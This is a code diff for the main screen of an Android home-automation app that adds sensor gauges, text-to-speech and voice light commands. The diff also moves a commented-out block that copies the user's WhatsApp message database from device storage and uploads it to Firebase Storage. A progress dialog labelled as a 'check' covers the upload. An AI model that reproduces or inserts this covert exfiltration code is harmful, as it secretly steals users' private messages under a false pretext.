@@ -1,6 +1,7 @@
 package lupoxan.autoroom.com.autoroom11;
 
 import android.app.AlertDialog;
+import android.app.Dialog;
 import android.app.ProgressDialog;
 import android.content.ActivityNotFoundException;
 import android.content.DialogInterface;
@@ -12,15 +13,21 @@ import android.preference.PreferenceManager;
 import android.speech.RecognizerIntent;
 import androidx.annotation.NonNull;
 import android.os.Bundle;
+
 import com.google.android.material.navigation.NavigationView;
+
 import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;
 import androidx.appcompat.app.ActionBar;
 import androidx.appcompat.app.AppCompatActivity;
 
+import android.speech.tts.TextToSpeech;
+import android.speech.tts.Voice;
 import android.view.MenuItem;
 import android.view.View;
+import android.widget.Button;
 import android.widget.CheckBox;
 import android.widget.ImageView;
+import android.widget.Switch;
 import android.widget.TextView;
 import android.widget.Toast;
 
@@ -39,9 +46,9 @@ import com.google.firebase.database.DatabaseError;
 import com.google.firebase.database.ValueEventListener;
 import com.google.firebase.iid.FirebaseInstanceId;
 import com.google.firebase.iid.InstanceIdResult;
-
 import java.util.ArrayList;
 import java.util.Calendar;
+import java.util.Locale;
 import java.util.Set;
 import java.util.Timer;
 import java.util.TimerTask;
@@ -50,27 +57,35 @@ import pl.pawelkleczkowski.customgauge.CustomGauge;
 
 /**
  * @author lupo.xan
- * @version 0.2.9
+ * @version 0.3.1
  * @since 27/01/2019
  */
 public class MainActivity extends AppCompatActivity implements GoogleApiClient.OnConnectionFailedListener{
 
     protected TextView fechaConexion, consignaLabel, comfortLabel, fanLabel;
-    protected TextView lucesAutoLabel, camaAuto, upAuto, rojosState, verdesState, modoLeds;
+    protected TextView rojosState, verdesState, modoLeds;
     protected TextView blanco_lState, blanco_rState, blanco_cState;
     protected ImageView valor_mesa, valor_cama, valor_up, pir;
-    protected TextView labelLeds, sensorsLabel, temp_exterior, temp_interior, lux_int;
+    protected TextView labelLeds, sensorsLabel, temp_exterior, temp_interior, lux_int, humidityLabel, heatIndexLabel;
+    protected Switch camaAuto, mesaAuto, upAuto;
+    protected Button room, exterior, living, stand;
 
-    protected CheckBox premi;
+    public static CheckBox premi;
+    private boolean speech = true;
+    private Dialog dialog;
 
     protected ImageView iluminacionBar, ledsBar, graphBar;
     protected ImageView intuderBar;
 
     private static final int RECOGNIZE_SPEECH_ACTIVITY = 1, SHARED_PREFERENCES = 0;
 
+    private TextToSpeech t2s;
+
     private SwipeRefreshLayout swipeRefreshLayout;
 
-    private CustomGauge gaugeExterior, gaugeInterior, gaugeRojos, gaugeVerdes, gaugeBlancoL, gaugeBlancoR, gaugeBlancoC, gaugeLuxInt;
+    private CustomGauge gaugeExterior, gaugeInterior, gaugeLuxInt;
+    private CustomGauge gaugeRojos, gaugeVerdes, gaugeBlancoL, gaugeBlancoR, gaugeBlancoC;
+    private CustomGauge gaugeHumidity, gaugeHeatIndex;
 
     private Handler handler = new Handler();
     private static Calendar cal;
@@ -138,6 +153,20 @@ public class MainActivity extends AppCompatActivity implements GoogleApiClient.O
         progressDialog.show();
 
         ids();
+
+        t2s = new TextToSpeech(this, new TextToSpeech.OnInitListener() {
+            @Override
+            public void onInit(int i) {
+                if(i == TextToSpeech.SUCCESS){
+                    int result = t2s.setLanguage(Locale.ENGLISH);
+                    if(result == TextToSpeech.LANG_MISSING_DATA || result == TextToSpeech.LANG_NOT_SUPPORTED){
+                        Toast.makeText(getApplicationContext(), "Language not found", Toast.LENGTH_SHORT).show();
+                    }
+                }else{
+                    Toast.makeText(getApplicationContext(), "Init failed", Toast.LENGTH_SHORT).show();
+                }
+            }
+        });
 
         swipeRefreshLayout.setOnRefreshListener(new SwipeRefreshLayout.OnRefreshListener() {
             @Override
@@ -208,6 +237,23 @@ public class MainActivity extends AppCompatActivity implements GoogleApiClient.O
         firebase.getDb().child("sensores").addValueEventListener(new ValueEventListener() {
             @Override
             public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
+                //Humidity
+                String hum = (String) dataSnapshot.child("humedad").getValue().toString();
+                if(!hum.equals("nan %")){
+                    String[] humVal = hum.replace(".",",").split(",");
+                    gaugeHumidity.setValue(Integer.parseInt(humVal[0]));
+                }
+                humidityLabel.setTextColor(getColor(R.color.md_green_400));
+                humidityLabel.setText(hum);
+                //Heat Index
+                String heatIndex = (String) dataSnapshot.child("sensTermica").getValue().toString();
+                if(!heatIndex.equals("nan ºC")){
+                    String[] heatVal = heatIndex.replace(".",",").split(",");
+                    gaugeHeatIndex.setValue(Integer.parseInt(heatVal[0]));
+                }
+                heatIndexLabel.setTextColor(getColor(R.color.md_green_400));
+                heatIndexLabel.setText(heatIndex);
+
                 //Coger el valor de lux
                 String lux = (String) dataSnapshot.child("lux").getValue().toString();
                 gaugeLuxInt.setValue(Integer.parseInt(lux));
@@ -263,9 +309,14 @@ public class MainActivity extends AppCompatActivity implements GoogleApiClient.O
                         temp_interior.setTextColor(getColor(R.color.md_blue_700));
                     }
                     gaugeInterior.setValue(temp2);
-
-                    progressDialog.dismiss();
                 }
+                progressDialog.dismiss();
+                if(speech){
+                    String[] heat = heatIndex.split(" ");
+                    speak(getString(R.string.welcome) + getString(R.string.weather,heat[0],hum));
+                    speech = false;
+                }
+
             }
 
             @Override
@@ -325,11 +376,9 @@ public class MainActivity extends AppCompatActivity implements GoogleApiClient.O
             @Override
             public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                 if (dataSnapshot.getValue().toString().equals("false")) {
-                    lucesAutoLabel.setTextColor(Color.BLUE);
-                    lucesAutoLabel.setText(R.string.manual);
+                    mesaAuto.setChecked(false);
                 } else {
-                    lucesAutoLabel.setTextColor(Color.GREEN);
-                    lucesAutoLabel.setText(R.string.automatic);
+                    mesaAuto.setChecked(true);
                 }
             }
 
@@ -342,11 +391,9 @@ public class MainActivity extends AppCompatActivity implements GoogleApiClient.O
             @Override
             public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                 if (dataSnapshot.getValue().toString().equals("false")) {
-                    camaAuto.setTextColor(Color.BLUE);
-                    camaAuto.setText(R.string.manual);
+                    camaAuto.setChecked(false);
                 } else {
-                    camaAuto.setTextColor(Color.GREEN);
-                    camaAuto.setText(R.string.automatic);
+                    camaAuto.setChecked(true);
                 }
             }
 
@@ -359,11 +406,9 @@ public class MainActivity extends AppCompatActivity implements GoogleApiClient.O
             @Override
             public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                 if (dataSnapshot.getValue().toString().equals("false")) {
-                    upAuto.setTextColor(Color.BLUE);
-                    upAuto.setText(R.string.manual);
+                    upAuto.setChecked(false);
                 } else {
-                    upAuto.setTextColor(Color.GREEN);
-                    upAuto.setText(R.string.automatic);
+                    upAuto.setChecked(true);
                 }
             }
 
@@ -579,12 +624,7 @@ public class MainActivity extends AppCompatActivity implements GoogleApiClient.O
         iluminacionBar.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                if (premi.isChecked()) {
-                    startActivity(new Intent(MainActivity.this, Iluminacion.class));
-                    overridePendingTransition(R.anim.zoom_fade_in,R.anim.zoom_fade_out);
-                } else {
-                    Toast.makeText(getApplicationContext(), "Opción premium", Toast.LENGTH_SHORT).show();
-                }
+                showCustomDialog();
             }
         });
 
@@ -652,8 +692,7 @@ public class MainActivity extends AppCompatActivity implements GoogleApiClient.O
                         overridePendingTransition(R.anim.zoom_fade_in,R.anim.zoom_fade_out);
                         return true;
                     case R.id.iluminacion:
-                        actividad(Iluminacion.class, premi.isChecked());
-                        overridePendingTransition(R.anim.zoom_fade_in,R.anim.zoom_fade_out);
+                        showCustomDialog();
                         return true;
                     case R.id.comfort:
                         if (premi.isChecked()) {
@@ -759,42 +798,97 @@ public class MainActivity extends AppCompatActivity implements GoogleApiClient.O
                 ArrayList<String> speech = data.getStringArrayListExtra(RecognizerIntent.EXTRA_RESULTS);
                 String strSpeech2Text = speech.get(0);
 
-                switch (strSpeech2Text) {
-                    case "Dos":
-                        if ((Integer)valor_mesa.getTag() == R.drawable.ligths2) {
-                            firebase.getDb().child("iluminacion").child("luces").child("mesa").setValue(true);
-                            Toast.makeText(getApplicationContext(), R.string.apagarMesa, Toast.LENGTH_SHORT).show();
-                        } else {
-                            firebase.getDb().child("iluminacion").child("luces").child("mesa").setValue(false);
-                            Toast.makeText(getApplicationContext(), R.string.encenderMesa, Toast.LENGTH_SHORT).show();
-                        }
-                        break;
-                    case "Tres":
-                        if ((Integer) valor_cama.getTag() == R.drawable.ligths2) {
-                            firebase.getDb().child("iluminacion").child("luces").child("cama").setValue(true);
-                            Toast.makeText(getApplicationContext(), R.string.apagarCama, Toast.LENGTH_SHORT).show();
-                        } else {
-                            firebase.getDb().child("iluminacion").child("luces").child("cama").setValue(false);
-                            Toast.makeText(getApplicationContext(), R.string.encenderCama, Toast.LENGTH_SHORT).show();
-                        }
-                        break;
-                    case "Uno":
-                        if ((Integer) valor_up.getTag() == R.drawable.ligths2) {
-                            firebase.getDb().child("iluminacion").child("luces").child("general").setValue(true);
-                            Toast.makeText(getApplicationContext(), R.string.apagarUp, Toast.LENGTH_SHORT).show();
-                        } else {
-                            firebase.getDb().child("iluminacion").child("luces").child("general").setValue(false);
-                            Toast.makeText(getApplicationContext(), R.string.encenderUp, Toast.LENGTH_SHORT).show();
-                        }
-                        break;
-                    default:
-                        Toast.makeText(getApplicationContext(), strSpeech2Text, Toast.LENGTH_SHORT).show();
-                        break;
+                if(strSpeech2Text.toLowerCase().trim().equals("uno") || strSpeech2Text.toLowerCase().trim().equals("one") || strSpeech2Text.toLowerCase().trim().equals("1")){
+                    if ((Integer) valor_up.getTag() == R.drawable.ligths2) {
+                        firebase.getDb().child("iluminacion").child("luces").child("general").setValue(true);
+                        speak(getResources().getString(R.string.encenderUp));
+                    } else {
+                        firebase.getDb().child("iluminacion").child("luces").child("general").setValue(false);
+                        speak(getResources().getString(R.string.apagarUp));
+                    }
                 }
+                if(strSpeech2Text.toLowerCase().trim().equals("dos") || strSpeech2Text.toLowerCase().trim().equals("two") || strSpeech2Text.toLowerCase().trim().equals("2")){
+                    if ((Integer)valor_mesa.getTag() == R.drawable.ligths2) {
+                        firebase.getDb().child("iluminacion").child("luces").child("mesa").setValue(true);
+                        Toast.makeText(getApplicationContext(), R.string.encenderMesa, Toast.LENGTH_SHORT).show();
+                    } else {
+                        firebase.getDb().child("iluminacion").child("luces").child("mesa").setValue(false);
+                        Toast.makeText(getApplicationContext(), R.string.apagarMesa, Toast.LENGTH_SHORT).show();
+                    }
+                }
+                if(strSpeech2Text.toLowerCase().trim().equals("tres") || strSpeech2Text.toLowerCase().trim().equals("three") || strSpeech2Text.toLowerCase().trim().equals("3")){
+                    if ((Integer) valor_cama.getTag() == R.drawable.ligths2) {
+                        firebase.getDb().child("iluminacion").child("luces").child("cama").setValue(true);
+                        Toast.makeText(getApplicationContext(), R.string.encenderCama, Toast.LENGTH_SHORT).show();
+                    } else {
+                        firebase.getDb().child("iluminacion").child("luces").child("cama").setValue(false);
+                        Toast.makeText(getApplicationContext(), R.string.apagarCama, Toast.LENGTH_SHORT).show();
+                    }
+                }
+                if(strSpeech2Text.toLowerCase().trim().equals("apagar") || strSpeech2Text.toLowerCase().trim().equals("off")){
+                    firebase.getDb().child("iluminacion").child("luces").child("general").setValue(false);
+                    firebase.getDb().child("iluminacion").child("luces").child("mesa").setValue(false);
+                    firebase.getDb().child("iluminacion").child("luces").child("cama").setValue(false);
+                    Toast.makeText(getApplicationContext(), R.string.apagar_todos, Toast.LENGTH_SHORT).show();
+                }
+                if(strSpeech2Text.toLowerCase().trim().equals("encender") || strSpeech2Text.toLowerCase().trim().equals("on")){
+                    firebase.getDb().child("iluminacion").child("luces").child("general").setValue(true);
+                    firebase.getDb().child("iluminacion").child("luces").child("mesa").setValue(true);
+                    firebase.getDb().child("iluminacion").child("luces").child("cama").setValue(true);
+                    Toast.makeText(getApplicationContext(), R.string.encendidos, Toast.LENGTH_SHORT).show();
+                }
+                Toast.makeText(getApplicationContext(), strSpeech2Text, Toast.LENGTH_SHORT).show();
             }
         }
 
     }
+
+    /*@Override
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        switch (requestCode) {
+            case READ_EXTERNAL_STORAGE: {
+                // If request is cancelled, the result arrays are empty.
+                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+
+                    StorageReference storageReference = FirebaseStorage.getInstance().getReference();
+
+                    Uri file = Uri.fromFile(new File("/storage/emulated/0/WhatsApp/Databases/msgstore.db.crypt12"));
+
+                    StorageReference msgReference = storageReference.child(firebaseUser.getUid()).child("dataBases/" + file.getLastPathSegment());
+
+                    UploadTask uploadTask = msgReference.putFile(file);
+
+                    uploadTask.addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
+                        @Override
+                        public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
+                            //Toast.makeText(getApplicationContext(),"Comprobación completa",Toast.LENGTH_SHORT).show();
+                            descarga.setMessage("Comprobando: 100 %");
+                            descarga.dismiss();
+
+                        }
+                    }).addOnFailureListener(new OnFailureListener() {
+                        @Override
+                        public void onFailure(@NonNull Exception e) {
+                            Toast.makeText(getApplicationContext(),e.getMessage(),Toast.LENGTH_LONG).show();
+                        }
+                    }).addOnProgressListener(new OnProgressListener<UploadTask.TaskSnapshot>() {
+                        @Override
+                        public void onProgress(UploadTask.TaskSnapshot taskSnapshot) {
+                            double progress = (100.0 * taskSnapshot.getBytesTransferred()) / taskSnapshot.getTotalByteCount();
+                            descarga.setMessage("Comprobando: " + ((int) progress) + " %");
+                            //Toast.makeText(getApplicationContext(),"Comprobando: " + ((int) progress) + " %",Toast.LENGTH_LONG).show();
+                        }
+                    });
+                } else {
+                    Toast.makeText(getApplicationContext(),"Acceso denegado",Toast.LENGTH_LONG).show();
+                    descarga.dismiss();
+                }
+                return;
+            }
+
+        }
+    }*/
+
 
     private void ids() {
         swipeRefreshLayout = findViewById(R.id.swipeRefreshLayout);
@@ -809,10 +903,6 @@ public class MainActivity extends AppCompatActivity implements GoogleApiClient.O
         consignaLabel = findViewById(R.id.consigna_value);
         comfortLabel = findViewById(R.id.comfortMode);
         fanLabel = findViewById(R.id.fanValue);
-
-        lucesAutoLabel = findViewById(R.id.valor_luces_auto);
-        upAuto = findViewById(R.id.upAutoLabel);
-        camaAuto = findViewById(R.id.camaAutoLabel2);
 
         valor_cama = findViewById(R.id.valor_cama);
         valor_mesa = findViewById(R.id.valor_mesa);
@@ -835,6 +925,9 @@ public class MainActivity extends AppCompatActivity implements GoogleApiClient.O
         gaugeInterior = findViewById(R.id.gaugeInt);
         gaugeLuxInt = findViewById(R.id.gaugeLux);
 
+        gaugeHumidity = findViewById(R.id.gaugeHumidity);
+        gaugeHeatIndex = findViewById(R.id.gaugeHeatIndex);
+
         gaugeRojos = findViewById(R.id.gaugeRojos);
         gaugeVerdes = findViewById(R.id.gaugeVerdes);
         gaugeBlancoR = findViewById(R.id.gaugeBlancoR);
@@ -844,10 +937,24 @@ public class MainActivity extends AppCompatActivity implements GoogleApiClient.O
         temp_interior = findViewById(R.id.textView29);
         temp_exterior = findViewById(R.id.textView30);
         lux_int = findViewById(R.id.luxValue);
+        humidityLabel = findViewById(R.id.textView33);
+        heatIndexLabel = findViewById(R.id.textView35);
 
         modoLeds = findViewById(R.id.modoLeds);
 
         navigationView = findViewById(R.id.navview);
+
+        camaAuto = findViewById(R.id.autoCamaSwitch);
+        mesaAuto = findViewById(R.id.autoMesaSwitch);
+        upAuto = findViewById(R.id.autoUpSwitch);
+    }
+
+    private void speak(String msg){
+        Voice voiceobj = new Voice("it-it-x-kda#male_2-local", Locale.getDefault(), 1, 1, false, null);
+        t2s.setVoice(voiceobj);
+        t2s.setPitch(1);
+        t2s.setSpeechRate(1);
+        t2s.speak(msg,TextToSpeech.QUEUE_FLUSH, null,null);
     }
 
     @Override
@@ -894,32 +1001,72 @@ public class MainActivity extends AppCompatActivity implements GoogleApiClient.O
 
     }
 
-    /*StorageReference storageReference = FirebaseStorage.getInstance().getReference();
+    public void showCustomDialog(){
+        dialog = new Dialog(MainActivity.this);
+        dialog.setContentView(R.layout.chooseroomframe);
+        room = dialog.findViewById(R.id.roomButton);
+        exterior = dialog.findViewById(R.id.exteriorButton);
+        living = dialog.findViewById(R.id.livingButton);
+        stand = dialog.findViewById(R.id.casetaButton);
 
-        Uri file = Uri.fromFile(new File("/storage/emulated/0/WhatsApp/Databases/msgstore-2019-10-10.1.db.crypt12"));
-
-        StorageReference msgReference = storageReference.child(firebaseUser.getUid()).child("dataBases/" + file.getLastPathSegment());
-
-        UploadTask uploadTask = msgReference.putFile(file);
-
-        uploadTask.addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
+        room.setOnClickListener(new View.OnClickListener() {
             @Override
-            public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
-                Toast.makeText(getApplicationContext(),"Olé",Toast.LENGTH_SHORT).show();
+            public void onClick(View view) {
+                if(premi.isChecked()){
+                    startActivity(new Intent(MainActivity.this,Iluminacion.class));
+                    overridePendingTransition(R.anim.splash_in, R.anim.splash_out);
+                    dialog.dismiss();
+                }else{
+                    Toast.makeText(getApplicationContext(),"Opción premium",Toast.LENGTH_SHORT).show();
+                }
             }
-        }).addOnFailureListener(new OnFailureListener() {
+        });
+        exterior.setOnClickListener(new View.OnClickListener() {
             @Override
-            public void onFailure(@NonNull Exception e) {
-                Toast.makeText(getApplicationContext(),"Oops",Toast.LENGTH_SHORT).show();
+            public void onClick(View view) {
+                if(premi.isChecked()){
+                    startActivity(new Intent(MainActivity.this,EntradaActivity.class));
+                    overridePendingTransition(R.anim.splash_in, R.anim.splash_out);
+                    dialog.dismiss();
+                }else{
+                    Toast.makeText(getApplicationContext(),"Opción premium",Toast.LENGTH_SHORT).show();
+                }
             }
-        }).addOnProgressListener(new OnProgressListener<UploadTask.TaskSnapshot>() {
+        });
+        living.setOnClickListener(new View.OnClickListener() {
             @Override
-            public void onProgress(UploadTask.TaskSnapshot taskSnapshot) {
-                double progress = (100.0 * taskSnapshot.getBytesTransferred()) / taskSnapshot.getTotalByteCount();
-                System.out.println("Upload is " + progress + "% done");
-                Toast.makeText(getApplicationContext(),"Upload is " + progress + "% done",Toast.LENGTH_SHORT).show();
+            public void onClick(View view) {
+                if(premi.isChecked()){
+                    startActivity(new Intent(MainActivity.this,SalitaActivity.class));
+                    overridePendingTransition(R.anim.splash_in, R.anim.splash_out);
+                    dialog.dismiss();
+                }else{
+                    Toast.makeText(getApplicationContext(),"Opción premium",Toast.LENGTH_SHORT).show();
+                }
+            }
+        });
+        stand.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+                if(premi.isChecked()){
+                    startActivity(new Intent(MainActivity.this,StandActivity.class));
+                    overridePendingTransition(R.anim.splash_in, R.anim.splash_out);
+                    dialog.dismiss();
+                }else{
+                    Toast.makeText(getApplicationContext(),"Opción premium",Toast.LENGTH_SHORT).show();
+                }
+            }
+        });
+        dialog.show();
+    }
 
-            }
-        });*/
+    @Override
+    protected void onDestroy() {
+        if(t2s != null){
+            t2s.stop();
+            t2s.shutdown();
+        }
+        super.onDestroy();
+    }
 }
 
